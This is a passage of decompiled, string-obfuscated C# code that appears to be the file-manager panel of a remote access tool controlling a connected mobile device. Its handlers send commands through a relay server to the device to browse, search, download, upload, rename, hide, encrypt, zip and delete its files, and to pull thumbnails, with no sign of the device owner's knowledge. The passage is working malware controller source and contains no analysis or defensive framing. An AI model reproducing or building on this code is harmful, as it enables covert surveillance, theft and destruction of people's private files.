				myscr.Image = Btcli.screen;
				myico.Image = Btcli.wallpaper;
				mytitle.Text = BTConst.Filesmanagestr + EXGuarder._2D454B1A + Btcli.name + EXGuarder._2D454B1A + Btcli.country;
			}
			else
			{
				myico.Image = Resources.no_con;
				myscr.Image = null;
				mytitle.Text = BTConst.Filesmanagestr + EXGuarder._2D454B1A + BTConst.Disconnectedstr;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
	{
		if (!loadimages)
		{
			LoadThumbs();
			autoloadtogle.ForeColor = Color.FromArgb(2, 176, 117);
			autoloadtogle.RectColor = Color.FromArgb(2, 176, 117);
		}
		else
		{
			StopLoadthumbs();
			autoloadtogle.ForeColor = Color.White;
			autoloadtogle.RectColor = Color.Gray;
		}
	}

	private void LoadThumbs()
	{
		loadimages = true;
	}

	private void StopLoadthumbs()
	{
		loadimages = false;
	}

	private void backgroundWorker_DoWork(object sender, DoWorkEventArgs e)
	{
		_Closure_0024__515_002D0 closure_0024__515_002D = default(_Closure_0024__515_002D0);
		_Closure_0024__515_002D2 closure_0024__515_002D2 = default(_Closure_0024__515_002D2);
		_Closure_0024__515_002D1 closure_0024__515_002D3 = default(_Closure_0024__515_002D1);
		while (!base.IsDisposed)
		{
			try
			{
				closure_0024__515_002D = new _Closure_0024__515_002D0(closure_0024__515_002D);
				closure_0024__515_002D._0024VB_0024Me = this;
				Thread.Sleep(1000);
				if (isloading)
				{
					continue;
				}
				closure_0024__515_002D._0024VB_0024Local_visibleRows = null;
				if (listfilesvew.InvokeRequired)
				{
					listfilesvew.Invoke(new VB_0024AnonymousDelegate_0(closure_0024__515_002D._Lambda_0024__0));
				}
				else
				{
					closure_0024__515_002D._0024VB_0024Local_visibleRows = GetVisibleItems(listfilesvew);
				}
				if (closure_0024__515_002D._0024VB_0024Local_visibleRows == null)
				{
					continue;
				}
				using List<OLVListItem>.Enumerator enumerator = closure_0024__515_002D._0024VB_0024Local_visibleRows.GetEnumerator();
				while (enumerator.MoveNext())
				{
					closure_0024__515_002D2 = new _Closure_0024__515_002D2(closure_0024__515_002D2);
					closure_0024__515_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2 = closure_0024__515_002D;
					closure_0024__515_002D2._0024VB_0024Local_item = enumerator.Current;
					closure_0024__515_002D3 = new _Closure_0024__515_002D1(closure_0024__515_002D3);
					closure_0024__515_002D3._0024VB_0024NonLocal__0024VB_0024Closure_3 = closure_0024__515_002D2;
					closure_0024__515_002D3._0024VB_0024Local_fileRow = (FileRow)closure_0024__515_002D3._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_item.RowObject;
					bool flag = false;
					int thumbloaded = closure_0024__515_002D3._0024VB_0024Local_fileRow.Thumbloaded;
					string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(listfilesvew.Tag, EXGuarder._066B763A), closure_0024__515_002D3._0024VB_0024Local_fileRow.Name));
					string text2 = Btcli.userfolder + EXGuarder._196E0E00 + codes.CleanFolderPath(Conversions.ToString(NewLateBinding.LateGet(listfilesvew.Tag, null, EXGuarder._67143E0E, new object[2]
					{
						EXGuarder._066B763A,
						EXGuarder._49412B57
					}, null, null, null)));
					if (thumbloaded != 1)
					{
						bool flag2 = false;
						if (text.ToLower().EndsWith(EXGuarder._425C614A) || text.ToLower().EndsWith(EXGuarder._3564503C))
						{
							string text3 = text.Substring(checked(text.LastIndexOf(EXGuarder._066B763A) + 1));
							if (Directory.Exists(text2 + EXGuarder._49412B57 + text3.Replace(EXGuarder._425C614A, EXGuarder._3D2F4C53).Replace(EXGuarder._3564503C, EXGuarder._3D2F4C53)))
							{
								using IEnumerator<string> enumerator2 = MyProject.Computer.FileSystem.GetFiles(text2 + EXGuarder._49412B57 + text3.Replace(EXGuarder._425C614A, EXGuarder._3D2F4C53).Replace(EXGuarder._3564503C, EXGuarder._3D2F4C53)).GetEnumerator();
								if (enumerator2.MoveNext())
								{
									string current = enumerator2.Current;
									FileInfo fileInfo = MyProject.Computer.FileSystem.GetFileInfo(current);
									string text4 = text2 + EXGuarder._49412B57 + text3.Replace(EXGuarder._425C614A, EXGuarder._3D2F4C53).Replace(EXGuarder._3564503C, EXGuarder._3D2F4C53) + EXGuarder._49412B57 + fileInfo.Name;
									if (File.Exists(text4))
									{
										closure_0024__515_002D3._0024VB_0024Local_fileRow.Icon = codes.ReadBitmapFromFile(text4);
										closure_0024__515_002D3._0024VB_0024Local_fileRow.Thumbloaded = 1;
										flag = true;
										Invoke(new VB_0024AnonymousDelegate_0(closure_0024__515_002D3._Lambda_0024__1));
										flag2 = true;
									}
								}
							}
						}
						if (flag2)
						{
							continue;
						}
						if (Directory.Exists(text2))
						{
							string text5 = Path.Combine(text2, Path.GetFileName(text));
							if (File.Exists(text5))
							{
								closure_0024__515_002D3._0024VB_0024Local_fileRow.Icon = codes.ReadBitmapFromFile(text5);
								closure_0024__515_002D3._0024VB_0024Local_fileRow.Thumbloaded = 1;
								flag = true;
								Invoke(new VB_0024AnonymousDelegate_0(closure_0024__515_002D3._Lambda_0024__2));
								continue;
							}
						}
					}
					if (loadimages && !flag)
					{
						string name = closure_0024__515_002D3._0024VB_0024Local_fileRow.Name;
						string text6 = EXGuarder._14135C6D;
						if (MyRes.ISupportedImages(name.ToLower()))
						{
							text6 = EXGuarder._10733A34;
						}
						else if (MyRes.ISupportedVideo(name.ToLower()))
						{
							text6 = EXGuarder._12597037;
						}
						if (Operators.CompareString(text6, EXGuarder._14135C6D, TextCompare: false) != 0 && Btcli.isConnected && closure_0024__515_002D3._0024VB_0024Local_fileRow.Thumbloaded == 0)
						{
							closure_0024__515_002D3._0024VB_0024Local_fileRow.Thumbloaded = 2;
							VB_0024AnonymousType_4<string, string, string, string, string> data = new VB_0024AnonymousType_4<string, string, string, string, string>(EXGuarder._46301953, text, EXGuarder._5A03441C, Btcli.SecoundIDF, text6);
							string value = BTCommand.FormatCommand(EXGuarder._76722D1B, data);
							Dictionary<string, object> dictionary = new Dictionary<string, object>();
							dictionary.Add(EXGuarder._125A1402, BTConst.wrk);
							dictionary.Add(EXGuarder._594D5945, value);
							Dictionary<string, object> chatData = dictionary;
							BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
							Thread.Sleep(10);
						}
					}
					Thread.Sleep(1);
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				loadimages = false;
				ProjectData.ClearProjectError();
			}
		}
	}

	private List<OLVListItem> GetVisibleItems(FastObjectListView listView)
	{
		List<OLVListItem> list = new List<OLVListItem>();
		checked
		{
			try
			{
				if (listView == null || listView.GetItemCount() == 0)
				{
					return list;
				}
				Rectangle clientRectangle = listView.ClientRectangle;
				int itemCount = listView.GetItemCount();
				if (listView.View == View.Details || listView.View == View.List)
				{
					if (!(listView.TopItem is OLVListItem { Index: var index }))
					{
						return list;
					}
					int bottom = clientRectangle.Bottom;
					int num = index;
					int num2 = itemCount - 1;
					for (int i = num; i <= num2; i++)
					{
						OLVListItem item = listView.GetItem(i);
						Rectangle bounds = item.Bounds;
						if (bounds.Top > bottom)
						{
							break;
						}
						if (bounds.IntersectsWith(clientRectangle))
						{
							list.Add(item);
						}
					}
				}
				else
				{
					int num3 = itemCount - 1;
					for (int j = 0; j <= num3; j++)
					{
						OLVListItem item2 = listView.GetItem(j);
						if (item2.Bounds.IntersectsWith(clientRectangle))
						{
							list.Add(item2);
						}
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
			return list;
		}
	}

	private void FolderDownloadsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			string text = Btcli.userfolder + EXGuarder._2819250E;
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			Process.Start(text);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void OpenToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listfilesvew.SelectedObjects.Count != 1 || !Btcli.isConnected)
		{
			return;
		}
		foreach (FileRow selectedObject in listfilesvew.SelectedObjects)
		{
			if (selectedObject != null && selectedObject.IsFile)
			{
				string newpth = string.Format(EXGuarder._17006D24, RuntimeHelpers.GetObjectValue(listfilesvew.Tag), selectedObject.Name);
				VB_0024AnonymousType_10<string, string> data = new VB_0024AnonymousType_10<string, string>(EXGuarder._186A745C, newpth);
				commandfiles(data);
			}
		}
	}

	private void commandfiles(object data)
	{
		string value = BTCommand.FormatCommand(EXGuarder._0B6D1409, RuntimeHelpers.GetObjectValue(data));
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._2D75063A, BTConst.wrk);
		dictionary.Add(EXGuarder._3B033D47, value);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listfilesvew.SelectedObjects.Count <= 0 || !Btcli.isConnected)
		{
			return;
		}
		Clipboard.Clear();
		foreach (FileRow selectedObject in listfilesvew.SelectedObjects)
		{
			if (selectedObject != null)
			{
				string prm = string.Format(EXGuarder._2A56043F, RuntimeHelpers.GetObjectValue(listfilesvew.Tag), selectedObject.Name);
				bool isFile = selectedObject.IsFile;
				Clipboard.Add(new object[3]
				{
					EXGuarder._20745F36,
					isFile,
					Format_Space(prm)
				});
			}
		}
	}

	private string Format_Space(string prm)
	{
		if (prm.Contains(Strings.Space(1)))
		{
			prm = prm.Replace(Strings.Space(1), EXGuarder._71131F79.ToLower());
		}
		return prm;
	}

	private void CutToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listfilesvew.SelectedObjects.Count <= 0 || !Btcli.isConnected)
		{
			return;
		}
		Clipboard.Clear();
		foreach (FileRow selectedObject in listfilesvew.SelectedObjects)
		{
			if (selectedObject != null)
			{
				string prm = string.Format(EXGuarder._633E0B08, RuntimeHelpers.GetObjectValue(listfilesvew.Tag), selectedObject.Name);
				bool isFile = selectedObject.IsFile;
				Clipboard.Add(new object[3]
				{
					EXGuarder._55065967,
					isFile,
					Format_Space(prm)
				});
			}
		}
	}

	private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Clipboard.Count <= 0)
		{
			return;
		}
		string value = Format_Space(Conversions.ToString(listfilesvew.Tag));
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		foreach (Array item in Clipboard)
		{
			Array instance = item;
			if (Operators.CompareString(NewLateBinding.LateIndexGet(instance, new object[1] { 0 }, null).ToString(), EXGuarder._79496F37, TextCompare: false) == 0)
			{
				list.Add(NewLateBinding.LateIndexGet(instance, new object[1] { 2 }, null).ToString());
			}
			else if (Operators.CompareString(NewLateBinding.LateIndexGet(instance, new object[1] { 0 }, null).ToString(), EXGuarder._4B1D1111, TextCompare: false) == 0)
			{
				list2.Add(NewLateBinding.LateIndexGet(instance, new object[1] { 2 }, null).ToString());
			}
		}
		string joinedList = EXGuarder._02383868;
		string _2 = EXGuarder._02383868;
		if (list.Count > 0)
		{
			 joinedList = string.Join(EXGuarder._5F475556, list);
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._6F305669, BTConst.filecomnd);
			dictionary.Add(EXGuarder._21516432, value);
			dictionary.Add(EXGuarder._0C601D66, EXGuarder._79496F37);
			dictionary.Add(EXGuarder._29681019, joinedList);
			Dictionary<string, object> chatData = dictionary;
			BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
		}
		if (list2.Count > 0)
		{
			_2 = string.Join(EXGuarder._5F475556, list2);
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._6F305669, BTConst.filecomnd);
			dictionary.Add(EXGuarder._21516432, value);
			dictionary.Add(EXGuarder._0C601D66, EXGuarder._4B1D1111);
			dictionary.Add(EXGuarder._29681019, _2);
			Dictionary<string, object> chatData2 = dictionary;
			BTEngine.commands(chatData2, Btcli.mobid, Btcli.Serverins.WSClient);
		}
		Clipboard.Clear();
	}

	private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listfilesvew.SelectedObjects.Count != 1 || !Btcli.isConnected)
		{
			return;
		}
		foreach (FileRow selectedObject in listfilesvew.SelectedObjects)
		{
			if (selectedObject != null)
			{
				myinputs myinputs2 = new myinputs();
				myinputs2.msgtitle.Text = EXGuarder._6E572145;
				myinputs2.inputtext.Text = selectedObject.Name;
				myinputs2.inputtext.Watermark = EXGuarder._42024012;
				if (myinputs2.ShowDialog() != DialogResult.OK)
				{
					break;
				}
				string text = myinputs2.inputtext.Text;
				if (codes.StrisEmpty(text))
				{
					BTAlerter.infos(EXGuarder._7328651E);
					break;
				}
				string old_name = string.Format(EXGuarder._1E3F0456, RuntimeHelpers.GetObjectValue(listfilesvew.Tag), selectedObject.Name);
				string new_name = string.Format(EXGuarder._1E3F0456, RuntimeHelpers.GetObjectValue(listfilesvew.Tag), text);
				VB_0024AnonymousType_20<string, string, string> data = new VB_0024AnonymousType_20<string, string, string>(EXGuarder._27141C30, old_name, new_name);
				commandfiles(data);
			}
		}
	}

	private void EncryptToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listfilesvew.SelectedObjects.Count <= 0 || !Btcli.isConnected)
		{
			return;
		}
		myinputs myinputs2 = new myinputs();
		myinputs2.msgtitle.Text = EXGuarder._2C6C0538;
		myinputs2.inputtext.Text = EXGuarder._50467474;
		myinputs2.inputtext.Watermark = EXGuarder._66745456;
		if (myinputs2.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		string text = myinputs2.inputtext.Text;
		if (codes.StrisEmpty(text))
		{
			BTAlerter.infos(EXGuarder._4C0F4A5F);
			return;
		}
		string text2 = EXGuarder._50467474;
		foreach (FileRow selectedObject in listfilesvew.SelectedObjects)
		{
			if (selectedObject != null)
			{
				string text3 = string.Format(EXGuarder._0C33515A, RuntimeHelpers.GetObjectValue(listfilesvew.Tag), selectedObject.Name);
				text2 = text2 + text3 + EXGuarder._08255D5F;
			}
		}
		if (!codes.StrisEmpty(text2))
		{
			VB_0024AnonymousType_21<string, string, string> data = new VB_0024AnonymousType_21<string, string, string>(EXGuarder._444D3A33, text, text2);
			commandfiles(data);
		}
	}

	private void DecodeToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listfilesvew.SelectedObjects.Count <= 0 || !Btcli.isConnected)
		{
			return;
		}
		myinputs myinputs2 = new myinputs();
		myinputs2.msgtitle.Text = EXGuarder._4C20466D;
		myinputs2.inputtext.Text = EXGuarder._78684062;
		myinputs2.inputtext.Watermark = EXGuarder._31792449;
		if (myinputs2.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		string text = myinputs2.inputtext.Text;
		if (codes.StrisEmpty(text))
		{
			BTAlerter.infos(EXGuarder._572E3C3E);
			return;
		}
		string text2 = EXGuarder._78684062;
		string text3 = EXGuarder._78684062;
		foreach (FileRow selectedObject in listfilesvew.SelectedObjects)
		{
			if (selectedObject != null)
			{
				string text4 = string.Format(EXGuarder._03373131, RuntimeHelpers.GetObjectValue(listfilesvew.Tag), selectedObject.Name);
				text2 = text2 + text4 + EXGuarder._471D7541;
				string _4031441E = EXGuarder._4031441E;
				if (text4.EndsWith(_4031441E))
				{
					int length = text4.LastIndexOf(_4031441E);
					text3 = text3 + text4.Substring(0, length) + EXGuarder._471D7541;
				}
				else
				{
					text3 = text3 + text4 + EXGuarder._3C2D7414;
				}
			}
		}
		if (!(codes.StrisEmpty(text2) | codes.StrisEmpty(text3)))
		{
			VB_0024AnonymousType_22<string, string, string, string> data = new VB_0024AnonymousType_22<string, string, string, string>(EXGuarder._222C6407, text, text2, text3);
			commandfiles(data);
		}
	}

	private void ZipToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listfilesvew.SelectedObjects.Count <= 0 || !Btcli.isConnected)
		{
			return;
		}
		myinputs myinputs2 = new myinputs();
		myinputs2.msgtitle.Text = EXGuarder._704E1011;
		myinputs2.inputtext.Text = EXGuarder._624E0B40;
		myinputs2.inputtext.Watermark = EXGuarder._154F4262;
		if (myinputs2.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		string text = myinputs2.inputtext.Text;
		if (codes.StrisEmpty(text))
		{
			BTAlerter.infos(EXGuarder._57061D40);
			return;
		}
		string text2 = EXGuarder._624E0B40;
		foreach (FileRow selectedObject in listfilesvew.SelectedObjects)
		{
			if (selectedObject != null && selectedObject.IsFile)
			{
				string text3 = string.Format(EXGuarder._3D6B174C, RuntimeHelpers.GetObjectValue(listfilesvew.Tag), selectedObject.Name);
				text2 = text2 + text3 + EXGuarder._77525568;
			}
		}
		if (!codes.StrisEmpty(text2))
		{
			if (!text.EndsWith(EXGuarder._14412A23))
			{
				text += EXGuarder._14412A23;
			}
			VB_0024AnonymousType_23<string, string, string> data = new VB_0024AnonymousType_23<string, string, string>(EXGuarder._3B585027, text, text2);
			commandfiles(data);
		}
	}

	private void UnZipToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listfilesvew.SelectedObjects.Count <= 0 || !Btcli.isConnected)
		{
			return;
		}
		foreach (FileRow selectedObject in listfilesvew.SelectedObjects)
		{
			if (selectedObject != null && selectedObject.IsFile)
			{
				string zpath = string.Format(EXGuarder._78780525, RuntimeHelpers.GetObjectValue(listfilesvew.Tag), selectedObject.Name);
				VB_0024AnonymousType_24<string, object, string> data = new VB_0024AnonymousType_24<string, object, string>(EXGuarder._2F633C66, listfilesvew.Tag, zpath);
				commandfiles(data);
			}
		}
	}

	private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listfilesvew.SelectedObjects.Count <= 0 || !Btcli.isConnected)
		{
			return;
		}
		foreach (FileRow selectedObject in listfilesvew.SelectedObjects)
		{
			if (selectedObject != null)
			{
				string fpath = string.Format(EXGuarder._2117373C, RuntimeHelpers.GetObjectValue(listfilesvew.Tag), selectedObject.Name);
				string ftype = EXGuarder._72231037;
				if (!selectedObject.IsFile)
				{
					ftype = EXGuarder._55284350;
					fpath = string.Format(EXGuarder._412F3834, Format_Space(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(listfilesvew.Tag, EXGuarder._79211749), selectedObject.Name))));
				}
				VB_0024AnonymousType_25<string, string, string> data = new VB_0024AnonymousType_25<string, string, string>(EXGuarder._2C207625, fpath, ftype);
				commandfiles(data);
				listfilesvew.RemoveObject(selectedObject);
			}
		}
	}

	private void AddFilesToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (!Btcli.isConnected)
		{
			return;
		}
		myinputs myinputs2 = new myinputs();
		myinputs2.msgtitle.Text = EXGuarder._52382304;
		myinputs2.inputtext.Text = EXGuarder._280C1C33;
		myinputs2.checkfolder.Visible = true;
		myinputs2.inputtext.Watermark = EXGuarder._55086223;
		if (myinputs2.ShowDialog() == DialogResult.OK)
		{
			string text = myinputs2.inputtext.Text;
			if (codes.StrisEmpty(text))
			{
				BTAlerter.infos(EXGuarder._11410964);
				return;
			}
			string nfpath = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(listfilesvew.Tag, EXGuarder._6B5E7477), text));
			VB_0024AnonymousType_26<string, string, string> data = new VB_0024AnonymousType_26<string, string, string>(EXGuarder._665A500B, myinputs2.checkfolder.Checked.ToString(), nfpath);
			commandfiles(data);
		}
	}

	private void HideToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listfilesvew.SelectedObjects.Count <= 0 || !Btcli.isConnected)
		{
			return;
		}
		foreach (FileRow selectedObject in listfilesvew.SelectedObjects)
		{
			if (selectedObject != null)
			{
				string old_name = string.Format(EXGuarder._1F034F74, RuntimeHelpers.GetObjectValue(listfilesvew.Tag), selectedObject.Name);
				string new_name = string.Format(EXGuarder._6F4E785F, RuntimeHelpers.GetObjectValue(listfilesvew.Tag), selectedObject.Name);
				VB_0024AnonymousType_20<string, string, string> data = new VB_0024AnonymousType_20<string, string, string>(EXGuarder._65504D79, old_name, new_name);
				commandfiles(data);
			}
		}
	}

	private void ShowToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listfilesvew.SelectedObjects.Count <= 0 || !Btcli.isConnected)
		{
			return;
		}
		checked
		{
			foreach (FileRow selectedObject in listfilesvew.SelectedObjects)
			{
				if (selectedObject == null)
				{
					continue;
				}
				string name = selectedObject.Name;
				if (name.Trim()[0] != '.')
				{
					continue;
				}
				string text = null;
				bool flag = false;
				int num = name.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					if (name.Trim()[i] != '.')
					{
						text += Conversions.ToString(name.Trim()[i]);
						flag = true;
					}
					else if (flag)
					{
						text += Conversions.ToString(name.Trim()[i]);
					}
				}
				string new_name = string.Format(EXGuarder._6B44476F, RuntimeHelpers.GetObjectValue(listfilesvew.Tag), text);
				string old_name = string.Format(EXGuarder._6B44476F, RuntimeHelpers.GetObjectValue(listfilesvew.Tag), name);
				VB_0024AnonymousType_20<string, string, string> data = new VB_0024AnonymousType_20<string, string, string>(EXGuarder._1A0B1553, old_name, new_name);
				commandfiles(data);
			}
		}
	}

	private void DownloadToolStripMenuItem_Click(object sender, EventArgs e)
	{
		startdownload(EXGuarder._20444D64);
	}

	private void startdownload(string FastType)
	{
		if (listfilesvew.SelectedObjects.Count == 0 || !Btcli.isConnected)
		{
			return;
		}
		foreach (FileRow selectedObject in listfilesvew.SelectedObjects)
		{
			if (selectedObject != null && selectedObject.IsFile)
			{
				string text = string.Format(EXGuarder._5F770B4D, RuntimeHelpers.GetObjectValue(listfilesvew.Tag), selectedObject.Name);
				string name = selectedObject.Name;
				string sizeDescription = selectedObject.SizeDescription;
				int index = DGVDATA.Rows.Add(name, text, sizeDescription, BTConst.Connectingstr, EXGuarder._25133513);
				DataGridViewRow dataGridViewRow = DGVDATA.Rows[index];
				dataGridViewRow.Tag = text;
				downloadsrows[text] = dataGridViewRow;
				StartDownloadAsync(dataGridViewRow, text, FastType);
			}
		}
	}

	private async Task StartDownloadAsync(DataGridViewRow newRow, string targetfilepath, string FastType)
	{
		WebSocketClient webSocketClient = null;
		_ = Btcli.SecoundIDF;
		try
		{
			string serverNextKey = ServersMgr.GetServerNextKey(Btcli.Serverins.Address);
			string json = await MyServer.JoinServer(new VB_0024AnonymousType_3<string, string, string, string>("join", "0", "0", serverNextKey), Btcli.Serverins.MainhttpClient, Btcli.Serverins.Address);
			JObject jObject;
			try
			{
				jObject = JObject.Parse(json);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				UpdateRowStatus(newRow, "Join failed");
				ProjectData.ClearProjectError();
				return;
			}
			if (jObject["Success"] == null)
			{
				UpdateRowStatus(newRow, "Join rejected");
				return;
			}
			string text = jObject["Success"].ToString().Trim('"');
			webSocketClient = new WebSocketClient(BTConst.downfilrstr, Btcli.address, Btcli.Serverins);
			try
			{
				await webSocketClient.ConnectAsync(text);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				UpdateRowStatus(newRow, "Connection failed");
				ProjectData.ClearProjectError();
				return;
			}
			Debuger.Log_d("Download socket ready", text);
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				newRow.Cells[0].Tag = webSocketClient;
			}));
			Dictionary<string, object> chatData = new Dictionary<string, object>
			{
				{
					"msg",
					BTConst.fetchcomnd
				},
				{ "extradata", targetfilepath },
				{ "skidf", text },
				{ "comp", FastType },
				{ "subc", "file" }
			};
			BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Exception ex3 = ex2;
			UpdateRowStatus(newRow, "Error");
			Debuger.Log_d("StartDownloadAsync error", ex3.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void UpdateRowStatus(DataGridViewRow row, string status)
	{
		if (row != null && base.IsHandleCreated)
		{
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				row.Cells[3].Value = status;
			}));
		}
	}

	private void ClearAllToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGVDATA.Rows.Count <= 0)
		{
			return;
		}
		checked
		{
			int num = DGVDATA.Rows.Count - 1;
			for (int i = num; i >= 0; i += -1)
			{
				try
				{
					DataGridViewRow dataGridViewRow = DGVDATA.Rows[i];
					if (Operators.ConditionalCompareObjectEqual(dataGridViewRow.Tag, EXGuarder._10380078, TextCompare: false))
					{
						DGVDATA.Rows.Remove(dataGridViewRow);
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private void DrakeUIButtonIcon7_Click(object sender, EventArgs e)
	{
		DGVFIND.Rows.Clear();
	}

	private void srchfilsbtn_Click(object sender, EventArgs e)
	{
		try
		{
			string text = null;
			string left = comsrchfor.Text;
			if (Operators.CompareString(left, EXGuarder._50473861, TextCompare: false) != 0)
			{
				if (Operators.CompareString(left, EXGuarder._384A051F, TextCompare: false) != 0)
				{
					if (Operators.CompareString(left, EXGuarder._38436513, TextCompare: false) != 0)
					{
						if (Operators.CompareString(left, EXGuarder._425B5F1A, TextCompare: false) == 0)
						{
							text = EXGuarder._1C401D35;
						}
					}
					else
					{
						text = EXGuarder._3C322F5B;
					}
				}
				else
				{
					text = EXGuarder._50083646;
				}
			}
			else
			{
				text = EXGuarder._4825406A;
			}
			if (text == null)
			{
				BTAlerter.infos(EXGuarder._5613655A);
				return;
			}
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._12453B76, EXGuarder._2F3A115B);
			dictionary.Add(EXGuarder._625B2820, text);
			Dictionary<string, object> chatData = dictionary;
			BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox(EXGuarder._463C4014 + ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void UploadToolStripMenuItem_Click(object sender, EventArgs e)
	{
		FilesUpload.Title = EXGuarder._332D034B;
		FilesUpload.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		FilesUpload.Filter = EXGuarder._18584A15;
		FilesUpload.FileName = string.Empty;
		FilesUpload.Multiselect = true;
		if (FilesUpload.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		string[] fileNames = FilesUpload.FileNames;
		if (fileNames.Length <= 0)
		{
			return;
		}
		string[] array = fileNames;
		foreach (string fileName in array)
		{
			try
			{
				FileInfo fileInfo = new FileInfo(fileName);
				string fullName = fileInfo.FullName;
				uploader uploader2 = new uploader();
				uploader2.Btcli = Btcli;
				uploader2.filePath = fullName;
				uploader2.filename = fileInfo.Name;
				uploader2.savepath = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(listfilesvew.Tag, EXGuarder._3E096951), fileInfo.Name));
				uploader2.mobid = Btcli.mobid;
				uploader2.Show();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void listfilesvew_MouseDoubleClick(object sender, MouseEventArgs e)
	{
		try
		{
			if (listfilesvew.SelectedObjects.Count <= 0)
			{
				return;
			}
			FileRow fileRow = (FileRow)listfilesvew.SelectedObjects[0];
			if (fileRow != null && !fileRow.IsFile && Btcli.isConnected)
			{
				string key = listfilesvew.Tag.ToString();
				navigateto(Conversions.ToString(Pnext(Conversions.ToString(listfilesvew.Tag), fileRow.Name)));
				if (visited.ContainsKey(key))
				{
					visited[key] = Conversions.ToString(listfilesvew.SelectedIndices[0]);
				}
				else
				{
					visited.Add(key, Conversions.ToString(listfilesvew.SelectedIndices[0]));
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIButtonIcon7_Click_1(object sender, EventArgs e)
	{
		_thumbView = !_thumbView;
		if (_thumbView)
		{
			listfilesvew.View = View.LargeIcon;
			listfilesvew.RowHeight = 96;
			toggleview.Symbol = 61542;
			toggleview.Text = BTConst.liststr;
		}
		else
		{
			listfilesvew.View = View.Details;
			listfilesvew.RowHeight = 25;
			toggleview.Symbol = 61502;
			toggleview.Text = BTConst.thumbsastr;
		}
		listfilesvew.Refresh();
	}

	private void StopDownloadToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGVDATA.Rows.Count <= 0 || DGVDATA.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGVDATA.SelectedRows)
		{
			try
			{
				if (selectedRow.Cells[0].Tag != null)
				{
					WebSocketClient webSocketClient = (WebSocketClient)selectedRow.Cells[0].Tag;
					if (webSocketClient != null)
					{
						webSocketClient.Disconnect(BTConst.downfilrstr, Btcli.address);
						selectedRow.Cells[3].Value = EXGuarder._53093B78;
						selectedRow.DefaultCellStyle.ForeColor = Color.Red;
						selectedRow.Tag = EXGuarder._1A50516D;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void PreviewToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listfilesvew.SelectedObjects.Count <= 0 || !Btcli.isConnected)
		{
			return;
		}
		bool flag = false;
		foreach (FileRow selectedObject in listfilesvew.SelectedObjects)
		{
